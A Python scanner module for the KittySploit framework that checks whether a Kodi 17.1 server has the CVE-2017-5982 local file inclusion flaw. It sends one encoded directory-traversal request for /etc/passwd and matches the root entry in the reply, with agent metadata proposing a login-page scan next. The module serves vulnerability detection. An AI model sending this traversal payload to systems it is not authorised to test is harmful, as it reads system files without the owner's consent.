#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Kodi 17."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Kodi 17.1 - Local File Inclusion Detection',
        'description': 'Kodi 17.1 is vulnerable to local file inclusion vulnerabilities because of insufficient validation of user input.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'kodi', 'lfi', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cxsecurity.com/issue/WLB-2017020164',
            'https://www.exploit-db.com/exploits/41312/',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-5982',
            'https://lists.debian.org/debian-lts-announce/2024/01/msg00009.html',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2017-5982',
    }

    def run(self):
        r = self.http_request(method="GET", path='/image/image%3A%2F%2F%2e%2e%252fetc%252fpasswd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Kodi 17.1 - Local File Inclusion detected",
                path='/image/image%3A%2F%2F%2e%2e%252fetc%252fpasswd',
            )
            return True
        return False

